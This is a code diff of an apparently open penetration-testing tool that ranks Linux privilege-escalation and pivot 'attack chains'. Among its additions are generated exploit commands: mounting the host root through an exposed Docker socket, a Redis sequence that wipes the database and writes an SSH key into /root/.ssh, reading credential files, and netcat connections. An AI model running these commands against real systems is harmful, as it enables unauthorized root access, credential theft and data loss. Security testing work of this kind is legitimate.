@@ -26,39 +26,27 @@ from nullpeas.core.exploit_templates import generate_exploit_for_chain
 
 
 # ----------------------------------------------------------------------
-# HIGH LEVEL OFFENSIVE MODEL
-# ----------------------------------------------------------------------
-
-"""
-This engine thinks like an attacker, but stops one step before exploitation.
-
-If something is basically a guaranteed root escalation,
-we call it that. We do not sanitize truth.
-"""
-
-
-# ----------------------------------------------------------------------
-# PRIORITY LOGIC
+# PRIORITY LOGIC (Updated Taxonomy)
 # ----------------------------------------------------------------------
 
 GOAL_PRIORITY = {
-    "root_shell": 1,
+    "root_compromise": 1,       # Was root_shell
     "privilege_escalation": 2,
     "persistence": 3,
     "credential_access": 4,
-    "lateral_movement": 5,
-    "reconnaissance": 6,
+    "internal_pivot": 5,        # Was lateral_movement
+    "reconnaissance": 6, 
 }
 
 LOOT_TYPES = {"credential_file", "password_store", "config_file", "info_disclosure"}
 
 CLASS_WEIGHT = {
-    "catastrophic": 10,  # Guaranteed Root / Game Over
-    "critical": 9,       # Immediate high risk (SSH Keys, Shadow file)
-    "severe": 7,         # High risk but might need extra steps
-    "high": 6,           # Added for safety
-    "useful": 4,         # Good for pivoting/recon
-    "niche": 1,          # Edge cases
+    "catastrophic": 10,
+    "critical": 9,
+    "severe": 7,
+    "high": 6,
+    "useful": 4,
+    "niche": 1,
 }
 
 EXPLOIT_WEIGHT = {
@@ -74,12 +62,11 @@ EXPLOIT_WEIGHT = {
 # ----------------------------------------------------------------------
 
 def _score_chain(classification: str, exploitability: str) -> int:
-    # Now 'critical' will correctly return 9 instead of default 1
     return CLASS_WEIGHT.get(classification, 1) + EXPLOIT_WEIGHT.get(exploitability, 1)
 
 
 # ----------------------------------------------------------------------
-# OFFENSIVE CLASSIFICATION LANGUAGE
+# OFFENSIVE CLASSIFICATION LANGUAGE (Tone Polish)
 # ----------------------------------------------------------------------
 
 def _offensive_truth_for(primitive: Primitive) -> str:
@@ -99,43 +86,50 @@ def _offensive_truth_for(primitive: Primitive) -> str:
 
     if t == "cron_exec_primitive":
         return "This provides timed and repeatable privileged execution. It is a persistence and escalation vector."
-
+    
     if t == "path_hijack_surface":
         return "Writable PATH directory allows interception of commands run by other users. High-value trap."
-
-    # === Capabilities Truths ===
+        
+    # === Capabilities ===
     if t == "group_pivot_primitive":
         return "Binary has 'cap_setgid'. Allows pivoting to sensitive groups (disk, shadow) which often leads to root."
-
+    
     if t == "arbitrary_file_access_primitive":
         return "Binary has 'cap_dac_override'. Bypasses all file permissions to Read/Write ANY file on the system."
 
-    # === Systemd Truths ===
+    # === Systemd ===
     if t == "systemd_unit_write":
         return "Writable service unit allows re-defining ExecStart. This grants root access upon service restart."
     if t == "systemd_binary_write":
         return "Service runs a writable binary. Overwriting this binary grants root access when the service runs."
-    if t == "systemd_relative_path":
-        return "Service executes a relative path. This allows Interception/Path Hijacking in the service's working directory."
 
     if t == "arbitrary_file_write_primitive":
         return "Arbitrary privileged file write enables service hijack, persistence, and potential direct escalation."
 
-    # === Loot Truths ===
+    # === Loot ===
     if t == "credential_file":
         return "Discovered credentials often allow immediate lateral movement or access to critical infrastructure."
-
+    
     if t == "password_store":
-        # Extra polish: reflect unreadable vs readable shadow-style loot
         if primitive.exploitability == "theoretical":
-            return "Password hashes file exists but is not readable from this account. Valuable recon, but not directly exploitable without another pivot."
+            return "Password hashes file exists but is not readable. Valuable recon, but not directly exploitable without another pivot."
         return "Access to password hashes allows offline cracking and potential impersonation of users."
 
     if t == "config_file":
         return "Configuration files frequently contain hardcoded database passwords, API keys, or internal network details."
 
-    if t == "info_disclosure":
-        return "Historical commands and environment configs provide critical context for pivoting and identifying high-value targets."
+    # === Network Surfaces (Mature Tone) ===
+    if t == "network_docker_surface":
+        return "Exposed Docker Socket (TCP) allows mounting the host root filesystem, guaranteeing root compromise."
+    
+    if t == "network_redis_surface":
+        return "Local Redis is a trusted surface. Unauthenticated access allows overwriting authorized_keys or cron jobs to gain shell access."
+        
+    if t == "network_db_surface":
+        return "Local database interfaces are frequently trusted surfaces. In real deployments they often lack strong authentication, offering pivot paths."
+        
+    if t == "network_remote_access_surface":
+        return "Internal remote access interfaces provide opportunities for lateral movement or session hijacking."
 
     if run_as.lower() == "root":
         return "This surface results in privileged execution and is realistically abusable."
@@ -153,10 +147,10 @@ def _build_direct_chains(primitives: List[Primitive]) -> List[AttackChain]:
     for p in primitives:
         # Direct Root Win Chains
         if p.type in {"root_shell_primitive", "docker_host_takeover", "suid_primitive"}:
-
+            
             chain = AttackChain(
                 chain_id=new_chain_id("root"),
-                goal="root_shell",
+                goal="root_compromise", # Taxonomy update
                 priority=1,
                 exploitability=p.exploitability,
                 stability=p.stability,
@@ -170,24 +164,11 @@ def _build_direct_chains(primitives: List[Primitive]) -> List[AttackChain]:
                     score=p.confidence.score,
                     reason=f"Derived directly from {p.surface} primitive"
                 ),
-                time_profile={
-                    "immediacy": "instant",
-                    "execution_window": "anytime"
-                },
-                operator_value={
-                    "persistence_potential": "high",
-                    "pivot_value": "medium",
-                    "loot_value": "high",
-                },
-                defender_risk={
-                    "breach_likelihood": "almost_certain",
-                    "impact_scope": "complete_host_compromise",
-                },
                 exploit_commands=generate_exploit_for_chain(p)
             )
             chains.append(chain)
 
-        # === Group Pivot (Caps) ===
+        # === Group Pivot ===
         if p.type == "group_pivot_primitive":
             chain = AttackChain(
                 chain_id=new_chain_id("privesc"),
@@ -206,37 +187,32 @@ def _build_direct_chains(primitives: List[Primitive]) -> List[AttackChain]:
             )
             chains.append(chain)
 
-        # === Loot & Intelligence ===
+        # === Loot ===
         if p.type in LOOT_TYPES:
-
             target_file = p.context.get("path", "file")
-
-            # v2.5 Fix: Only generate exploit command if NOT theoretical
+            
             cmds = []
             if p.exploitability != "theoretical":
                 cmds = [f"cat {target_file}"]
-
-            # Default goal/priority
+            
             goal = "credential_access"
             priority = 4
             summary_text = f"Intelligence collection via {p.surface}"
-
-            # 1. Info Disclosure Adjustment
+            
             if p.type == "info_disclosure":
                 goal = "reconnaissance"
-                priority = 5
-
-            # 2. Summary Adjustment
+                priority = 5  
+            
             if p.type in {"credential_file", "password_store"}:
                 summary_text = f"Credential harvest via {p.surface}"
-
+            
             chain = AttackChain(
                 chain_id=new_chain_id("loot"),
                 goal=goal,
                 priority=priority,
                 exploitability=p.exploitability,
-                stability=p.stability,  # Dynamic: Inherit from primitive
-                noise=p.noise,          # Dynamic: Inherit from primitive
+                stability=p.stability, 
+                noise=p.noise,         
                 classification=p.offensive_value.classification,
                 summary=summary_text,
                 offensive_truth=_offensive_truth_for(p),
@@ -244,6 +220,89 @@ def _build_direct_chains(primitives: List[Primitive]) -> List[AttackChain]:
                 dependent_surfaces=[p.surface],
                 confidence=ChainConfidence(score=p.confidence.score, reason="Verified file existence"),
                 exploit_commands=cmds
+            )
+            chains.append(chain)
+
+        # === Network Services (Semantic Logic) ===
+        
+        # 1. Docker (Catastrophic)
+        if p.type == "network_docker_surface":
+            ip = p.context.get("ip")
+            port = p.context.get("port")
+            cmds = [f"docker -H tcp://{ip}:{port} run --rm -it -v /:/mnt alpine chroot /mnt sh"]
+            
+            chain = AttackChain(
+                chain_id=new_chain_id("net_root"),
+                goal="root_compromise",
+                priority=1,
+                exploitability=p.exploitability,
+                stability=p.stability,
+                noise=p.noise,
+                classification="catastrophic",
+                summary="Root Compromise via Exposed Docker Socket",
+                offensive_truth=_offensive_truth_for(p),
+                steps=[
+                    {"primitive_id": p.id, "description": f"Connect to Docker Daemon on {ip}:{port}"},
+                    {"primitive_id": "mount", "description": "Mount host / filesystem and chroot"}
+                ],
+                dependent_surfaces=["network"],
+                confidence=ChainConfidence(score=9.5, reason="High-confidence default configuration issue"),
+                exploit_commands=cmds
+            )
+            chains.append(chain)
+            
+        # 2. Redis (Critical)
+        elif p.type == "network_redis_surface":
+            ip = p.context.get("ip")
+            port = p.context.get("port")
+            cmds = [
+                f"redis-cli -h {ip} flushall",
+                f"echo 'ssh-rsa ...' | redis-cli -h {ip} -x set crackit",
+                f"redis-cli -h {ip} config set dir /root/.ssh/",
+                f"redis-cli -h {ip} config set dbfilename 'authorized_keys'",
+                f"redis-cli -h {ip} save"
+            ]
+            chain = AttackChain(
+                chain_id=new_chain_id("net_svc"),
+                goal="privilege_escalation",
+                priority=2,
+                exploitability=p.exploitability,
+                stability=p.stability,
+                noise=p.noise,
+                classification="critical",
+                summary="PrivEsc via Local Redis",
+                offensive_truth=_offensive_truth_for(p),
+                steps=[
+                    {"primitive_id": p.id, "description": f"Connect to Redis on {ip}:{port}"},
+                    {"primitive_id": "write", "description": "Overwrite authorized_keys or cron job"}
+                ],
+                dependent_surfaces=["network"],
+                confidence=ChainConfidence(score=8.0, reason="Standard unauthenticated Redis risk"),
+                exploit_commands=cmds
+            )
+            chains.append(chain)
+
+        # 3. Databases / Generic (Pivot)
+        elif p.type in {"network_db_surface", "network_remote_access_surface", "network_generic_surface"}:
+            ip = p.context.get("ip")
+            port = p.context.get("port")
+            
+            chain = AttackChain(
+                chain_id=new_chain_id("net_pivot"),
+                goal="internal_pivot", # Taxonomy update
+                priority=5,
+                exploitability=p.exploitability,
+                stability=p.stability,
+                noise=p.noise,
+                classification=p.offensive_value.classification,
+                summary=f"Internal Pivot via {ip}:{port}",
+                offensive_truth=_offensive_truth_for(p),
+                steps=[
+                     {"primitive_id": p.id, "description": f"Enumerate/Exploit service on {ip}:{port}"}
+                ],
+                dependent_surfaces=["network"],
+                confidence=p.confidence,
+                exploit_commands=[f"nc -v {ip} {port}"]
             )
             chains.append(chain)
 
@@ -261,23 +320,23 @@ def _build_two_stage_chains(primitives: List[Primitive]) -> List[AttackChain]:
     5. DAC Override -> File Write -> Service (New)
     """
     chains = []
-
+    
     # Index file writes by the resource they control
     writes = {
-        p.affected_resource: p
-        for p in primitives
+        p.affected_resource: p 
+        for p in primitives 
         if p.type == "arbitrary_file_write_primitive" and p.affected_resource
     }
-
+    
     # Detect CAP_DAC_OVERRIDE (Universal Writer)
     universal_writers = [p for p in primitives if p.type == "arbitrary_file_access_primitive"]
 
     # 1. Service Hijacking (Generic Write Config -> Restart Service)
     services = [p for p in primitives if p.surface in {"systemd", "services"}]
-
+    
     for svc in services:
         config_path = svc.context.get("unit_file_path") or svc.context.get("config_path")
-
+        
         # A) Standard File Write Logic
         if config_path and config_path in writes:
             writer = writes[config_path]
@@ -293,7 +352,7 @@ def _build_two_stage_chains(primitives: List[Primitive]) -> List[AttackChain]:
 
     for c in cron_primitives:
         goal = "privilege_escalation" if c.run_as == "root" else "persistence"
-
+        
         chain = AttackChain(
             chain_id=new_chain_id("timed"),
             goal=goal,
@@ -318,15 +377,15 @@ def _build_two_stage_chains(primitives: List[Primitive]) -> List[AttackChain]:
 
     # 3. PATH Hijacking
     path_primitives = [p for p in primitives if p.type == "path_hijack_surface"]
-
+    
     for p in path_primitives:
         chain = AttackChain(
             chain_id=new_chain_id("trap"),
             goal="privilege_escalation",
             priority=3,
             exploitability=p.exploitability,
-            stability=p.stability,  # Dynamic
-            noise=p.noise,          # Dynamic
+            stability=p.stability, # Dynamic
+            noise=p.noise,         # Dynamic
             classification="severe",
             summary=f"PATH Interception via {p.affected_resource}",
             offensive_truth=_offensive_truth_for(p),
@@ -345,7 +404,7 @@ def _build_two_stage_chains(primitives: List[Primitive]) -> List[AttackChain]:
 
     # 4. Systemd Service Abuse
     systemd_primitives = [
-        p for p in primitives
+        p for p in primitives 
         if p.type in {"systemd_unit_write", "systemd_binary_write", "systemd_relative_path"}
     ]
 
@@ -358,7 +417,7 @@ def _build_two_stage_chains(primitives: List[Primitive]) -> List[AttackChain]:
 
         chain = AttackChain(
             chain_id=new_chain_id("service"),
-            goal="privilege_escalation",
+            goal="privilege_escalation", 
             priority=2,
             exploitability=p.exploitability,
             stability=p.stability,
@@ -386,7 +445,7 @@ def _create_service_write_chain(writer: Primitive, svc: Primitive, target: str, 
     """Helper to build file write -> service restart chain"""
     truth = "This chain reliably converts file write into root persistence."
     desc = f"Modify {target} via {writer.surface}"
-
+    
     if method == "capabilities":
         truth = "Using CAP_DAC_OVERRIDE bypasses file permissions to overwrite the service unit."
         desc = f"Overwrite {target} using binary with cap_dac_override"
@@ -410,7 +469,7 @@ def _create_service_write_chain(writer: Primitive, svc: Primitive, target: str, 
             score=min(writer.confidence.score, svc.confidence.score),
             reason="Validated resource intersection"
         ),
-        exploit_commands=[]
+        exploit_commands=[] 
     )
 
 
@@ -443,33 +502,3 @@ def build_attack_chains(primitives: List[Primitive]) -> List[AttackChain]:
     )
 
     return chains
-
-
-# ----------------------------------------------------------------------
-# RENDERING SUPPORT
-# ----------------------------------------------------------------------
-
-def chains_to_dict(chains: List[AttackChain]) -> List[Dict]:
-    return [asdict(c) for c in chains]
-
-
-def summarize_chains(chains: List[AttackChain]) -> str:
-    if not chains:
-        return "No meaningful offensive chains were identified."
-
-    strongest = chains[0]
-
-    txt = f"""
-Nullpeas Offensive Chain Summary
-
-Top Chain:
- - Goal: {strongest.goal}
- - Exploitability: {strongest.exploitability}
- - Stability: {strongest.stability}
- - Noise: {strongest.noise}
- - Truth: {strongest.offensive_truth}
-
-Total Chains Identified: {len(chains)}
-"""
-
-    return txt.strip()
